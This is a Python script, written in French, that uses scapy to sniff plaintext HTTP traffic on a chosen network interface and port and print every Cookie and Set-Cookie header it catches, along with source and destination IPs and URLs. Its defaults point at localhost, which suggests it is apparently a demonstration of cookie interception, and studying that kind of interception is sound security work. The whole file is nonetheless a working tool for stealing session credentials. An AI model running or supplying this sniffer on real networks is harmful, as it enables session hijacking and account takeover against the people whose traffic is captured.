# /// script
# dependencies = [
#   "scapy",
# ]
# ///
import argparse
import re
from datetime import datetime

from scapy.all import TCP, sniff


def extract_cookies(payload: str) -> list[str]:
    """Extrait les cookies d'une requête/réponse HTTP."""
    cookies = []

    # Cookie envoyé par le client (requête)
    cookie_match = re.search(r"Cookie:\s*([^\r\n]+)", payload, re.IGNORECASE)
    if cookie_match:
        cookies.append(f"[REQUEST] {cookie_match.group(1)}")

    # Set-Cookie envoyé par le serveur (réponse)
    set_cookie_matches = re.findall(r"Set-Cookie:\s*([^\r\n]+)", payload, re.IGNORECASE)
    for cookie in set_cookie_matches:
        cookies.append(f"[RESPONSE] {cookie}")

    return cookies


def main():
    parser = argparse.ArgumentParser(description="Sniffer de cookies HTTP")
    parser.add_argument(
        "-i",
        "--interface",
        default="lo0",
        help="Interface réseau (défaut: lo0). Utilisez 'all' pour toutes les interfaces.",
    )
    parser.add_argument(
        "-p",
        "--port",
        type=int,
        default=5555,
        help="Port à surveiller (défaut: 5555)",
    )
    parser.add_argument(
        "-v",
        "--verbose",
        action="store_true",
        help="Mode verbose: affiche tous les paquets HTTP (pas seulement les cookies)",
    )
    args = parser.parse_args()

    # Déterminer l'interface
    iface = None if args.interface == "all" else args.interface

    print("=" * 60)
    print("SNIFFER DE COOKIES HTTP")
    print("=" * 60)
    print(f"\nInterface: {args.interface if iface else 'TOUTES'}")
    print(f"Port surveillé: {args.port}")
    print(f"Mode verbose: {'Oui' if args.verbose else 'Non'}")
    print("\nEn attente de trafic HTTP...")
    print("(Les cookies interceptés apparaîtront ici)")
    print("\nAstuces:")
    print("  - 'lo0' pour localhost sur macOS")
    print("  - 'lo' pour localhost sur Linux")
    print("  - 'all' pour toutes les interfaces (tunnel bore, etc.)")
    print("  - 'en0' ou 'eth0' pour le WiFi/Ethernet")
    print("=" * 60)

    def packet_callback_with_port(packet):
        """Callback avec le port configuré."""
        if not packet.haslayer(TCP):
            return

        tcp = packet[TCP]

        if tcp.dport != args.port and tcp.sport != args.port:
            return

        if not hasattr(tcp, "load"):
            return

        try:
            payload = tcp.load.decode("utf-8", errors="ignore")
        except Exception:
            return

        timestamp = datetime.now().strftime("%H:%M:%S")
        src_ip = packet.sprintf("%IP.src%")
        dst_ip = packet.sprintf("%IP.dst%")

        # Mode verbose: afficher toutes les requêtes HTTP
        if args.verbose:
            url_match = re.search(r"(GET|POST|PUT|DELETE)\s+([^\s]+)", payload)
            if url_match:
                print(f"[{timestamp}] {src_ip} → {dst_ip} | {url_match.group(1)} {url_match.group(2)}")

        cookies = extract_cookies(payload)

        if cookies:
            print("\n" + "=" * 60)
            print(f"COOKIE INTERCEPTÉ! [{timestamp}]")
            print("=" * 60)
            print(f"Source: {src_ip}:{tcp.sport}")
            print(f"Destination: {dst_ip}:{tcp.dport}")
            print("-" * 60)

            for cookie in cookies:
                print(f"  {cookie}")

            url_match = re.search(r"(GET|POST)\s+([^\s]+)", payload)
            if url_match:
                print(f"\nURL: {url_match.group(1)} {url_match.group(2)}")

            print("=" * 60)

    try:
        sniff(
            iface=iface,
            prn=packet_callback_with_port,
            filter=f"tcp port {args.port}",
            store=False,
        )
    except PermissionError:
        print("\nERREUR: Droits insuffisants!")
        print("Relancez avec: sudo python sniffer.py")
    except KeyboardInterrupt:
        print("\n\nArrêt du sniffer.")


if __name__ == "__main__":
    main()
